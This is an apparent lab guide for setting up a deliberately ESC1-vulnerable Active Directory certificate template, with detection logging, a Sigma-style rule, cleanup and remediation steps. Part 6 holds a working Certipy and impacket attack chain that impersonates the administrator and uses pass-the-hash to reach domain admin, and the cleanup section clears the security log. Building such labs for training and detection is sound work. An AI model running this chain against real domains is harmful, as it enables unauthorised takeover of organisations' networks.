# ESC1 ADCS Lab Setup Guide

Quick guide to install ADCS and create a vulnerable ESC1 certificate template for testing. Assumes you already have a working Domain Controller.

## Prerequisites

- Active Directory Domain Controller (already configured)
- Windows Server 2016/2019/2022
- Domain Admin privileges
- Lab environment (NOT production)

## Part 1: Install ADCS

### 1.1 Install Certificate Authority Role

```powershell
# Install ADCS features
Install-WindowsFeature -Name AD-Certificate, ADCS-Cert-Authority, ADCS-Web-Enrollment -IncludeManagementTools

# Verify installation
Get-WindowsFeature | Where-Object {$_.Name -like "*ADCS*"}
```

### 1.2 Configure Enterprise Root CA

```powershell
# Configure as Enterprise Root CA
Install-AdcsCertificationAuthority `
    -CAType EnterpriseRootCA `
    -CACommonName "LAB-CA" `
    -CADistinguishedNameSuffix "DC=lab,DC=local" `
    -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
    -KeyLength 2048 `
    -HashAlgorithmName SHA256 `
    -ValidityPeriod Years `
    -ValidityPeriodUnits 10 `
    -Force

# Install Web Enrollment (optional - useful for testing)
Install-AdcsWebEnrollment -Force
```

### 1.3 Verify ADCS

```powershell
# Check CA service
Get-Service CertSvc

# Verify CA info
certutil -cainfo

# List available templates
Get-CATemplate
```

## Part 2: Create ESC1 Vulnerable Template

### 2.1 Open Certificate Templates Console

```powershell
# Launch Certificate Templates console
certtmpl.msc
```

### 2.2 Duplicate User Template

**In the Certificate Templates console:**

1. **Right-click** on **User** template → **Duplicate Template**
2. **Compatibility** tab (if prompted):
   - Certification Authority: **Windows Server 2016**
   - Certificate recipient: **Windows 10 / Windows Server 2016**

### 2.3 Configure General Settings

**General** tab:
- Template display name: `ESC1-Vulnerable`
- Template name: `ESC1-Vulnerable`
- Validity period: `1 year`
- Renewal period: `6 weeks`
- ✅ **Publish certificate in Active Directory**

### 2.4 Configure Subject Name (CRITICAL)

**Subject Name** tab:
- ⚠️ **Select**: `Supply in the request`
- ⚠️ **Uncheck**: `Use subject information from existing certificates...`

**This is the ESC1 vulnerability - allows requester to specify arbitrary SAN.**

### 2.5 Configure Security Permissions

**Security** tab:

**Add Domain Users:**
1. Click **Add**
2. Enter `Domain Users` → **Check Names** → **OK**
3. Grant the following permissions for **Domain Users**:
   - ✅ **Read**
   - ✅ **Enroll**
   - ✅ **Autoenroll** (optional)

**Other groups (leave as default):**
- **Domain Admins**: Full Control
- **Enterprise Admins**: Full Control
- **Authenticated Users**: Read (if present)

### 2.6 Verify Extensions

**Extensions** tab:
- **Application Policies** should include:
  - ✅ **Client Authentication** (1.3.6.1.5.5.7.3.2)
  - (This allows the cert to be used for Kerberos auth)

Click **OK** to create the template.

## Part 3: Publish Template to CA

### 3.1 Add Template to CA

**Option 1 - GUI:**
```powershell
# Open Certification Authority console
certsrv.msc
```

1. Expand your CA name (e.g., `LAB-CA`)
2. Right-click **Certificate Templates**
3. Select **New** → **Certificate Template to Issue**
4. Select `ESC1-Vulnerable` from the list
5. Click **OK**

**Option 2 - PowerShell:**
```powershell
# Publish template
Add-CATemplate -Name "ESC1-Vulnerable"

# Verify
Get-CATemplate
```

### 3.2 Verify Template is Published

```powershell
# Check published templates
certutil -CATemplates

# Should see ESC1-Vulnerable in the list
```

## Part 4: Verify ESC1 Vulnerability

### 4.1 From Windows Client (GUI Test)

```powershell
# Run as domain user (e.g., lowpriv)
certmgr.msc
```

1. Right-click **Personal** → **All Tasks** → **Request New Certificate**
2. Click **Next** → **Next**
3. You should see **ESC1-Vulnerable** template
4. Click **More information is required to enroll for this certificate**
5. In Subject tab, you can add **Alternative name** (this is the vuln)

### 4.2 From Kali/Linux (Certipy Test)

```bash
# Install Certipy (if not already)
pip3 install certipy-ad

# Enumerate templates
certipy find -u lowpriv@lab.local -p 'Password123!' -dc-ip 192.168.1.10 -vulnerable

# Look for ESC1 output:
# Certificate Templates
#   ESC1-Vulnerable
#     [!] Vulnerabilities
#       ESC1: ENROLLEE_SUPPLIES_SUBJECT
```

**If you see `ESC1: ENROLLEE_SUPPLIES_SUBJECT` - success! Lab is vulnerable.**

## Part 5: Enable Detection (Event Logging)

### 5.1 Enable Certificate Request Auditing

```powershell
# Enable auditing for certificate services
auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable

# Verify
auditpol /get /subcategory:"Certification Services"
```

### 5.2 Increase Security Log Size

```powershell
# Set Security log to 512 MB (certificates generate lots of events)
wevtutil sl Security /ms:536870912

# Verify
wevtutil gl Security | findstr maxSize
```

### 5.3 Test Detection

```powershell
# Generate test event
# Request a certificate (via GUI or Certipy)

# Check for Event ID 4887 (Certificate Request)
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4887)]]" -MaxEvents 5 | Format-List

# Key fields to check:
# - Requester (e.g., lowpriv)
# - Subject (CN=lowpriv)
# - Subject Alternative Name (should allow arbitrary values)
```

## Part 6: Test ESC1 Exploitation

### 6.1 From Kali Linux

```bash
# Request certificate for Administrator (as lowpriv user)
certipy req \
  -u lowpriv@lab.local \
  -p 'Password123!' \
  -target dc01.lab.local \
  -ca LAB-CA \
  -template ESC1-Vulnerable \
  -upn administrator@lab.local

# Output: administrator.pfx (certificate file)

# Authenticate using the certificate
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10

# Output: NT hash for administrator
# Use with impacket for domain admin access
```

### 6.2 Verify Attack Success

```bash
# Use the NT hash with impacket
impacket-psexec -hashes :NT_HASH administrator@dc01.lab.local

# Or use the TGT
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass administrator@dc01.lab.local
```

### 6.3 Check Detection Logs

```powershell
# On DC: Review Event 4887
Get-WinEvent -LogName Security -FilterXPath "*[System[(EventID=4887)]]" -MaxEvents 10 | 
  Select-Object TimeCreated, Message | 
  Format-List

# Red flags in ESC1 abuse:
# ✅ Requester: lowpriv (low-priv account)
# ✅ SAN: administrator@lab.local (high-priv target)
# ✅ Subject: CN=lowpriv (mismatch with SAN = abuse)
```

## ESC1 Attack Flow Summary

```
1. lowpriv user requests certificate
2. Specifies SAN = administrator@lab.local (ESC1 allows this)
3. CA issues certificate with administrator SAN
4. Use certificate to request Kerberos TGT for administrator
5. Extract NT hash from TGT response
6. Use NT hash for Pass-the-Hash → Domain Admin
```

## Detection Logic

**Event ID 4887 - Certificate Requested:**

```
ALERT if:
  Requester SamAccountName != Subject Alternative Name (UPN)
  AND
  SAN belongs to privileged account (Domain Admins, Enterprise Admins, Administrators)
  AND
  Requester is not privileged account
```

**Example Sigma Rule (pseudocode):**
```yaml
detection:
  selection:
    EventID: 4887
  filter:
    Requester: 'lowpriv'
    SAN: '*administrator*'
    Subject: 'CN=lowpriv*'
  condition: selection and filter
```

## Cleanup / Reset

### Remove Vulnerable Template

```powershell
# Remove from CA
Remove-CATemplate -Name "ESC1-Vulnerable" -Force

# Delete template itself
# In certtmpl.msc: Right-click ESC1-Vulnerable → Delete
```

### Revoke Compromised Certificates

```powershell
# List issued certificates
certutil -view -restrict "CommonName=administrator" -out "SerialNumber,NotAfter"

# Revoke certificate
certutil -revoke <SerialNumber>

# Publish CRL
certutil -CRL
```

### Clear Logs

```powershell
# Clear security log (start fresh)
wevtutil cl Security
```

## Hardening (Remediation)

To fix ESC1 vulnerability:

1. **Remove** `Supply in the request` from Subject Name
2. **Change to**: `Build from this Active Directory information`
3. **Require Manager Approval** for sensitive templates
4. **Remove Enroll** permission from Domain Users for privileged templates

## Common Issues

### Template Not Appearing in Certipy

```bash
# Clear cache and re-scan
rm -rf ~/.certipy
certipy find -u lowpriv@lab.local -p 'Password123!' -dc-ip 192.168.1.10 -vulnerable
```

### Certificate Request Fails

```powershell
# Check CA service
Get-Service CertSvc

# Restart if needed
Restart-Service CertSvc

# Check template permissions
# In certtmpl.msc → ESC1-Vulnerable → Security tab
# Verify Domain Users has Read + Enroll
```

### Event 4887 Not Logging

```powershell
# Re-enable auditing
auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable

# Restart audit service
Restart-Service EventLog

# Test by requesting a certificate
```

## Resources

- **ESC1 Original Research:** https://posts.specterops.io/certified-pre-owned-d95910965cd2
- **Certipy Tool:** https://github.com/ly4k/Certipy
- **All ESC Techniques:** https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services
- **Detection Sigma Rules:** https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security

---

**Lab is ready. ESC1 exploitation pathway active. Event logging enabled.**

**Next step:** Practice the attack, analyze the logs, build detection rules.
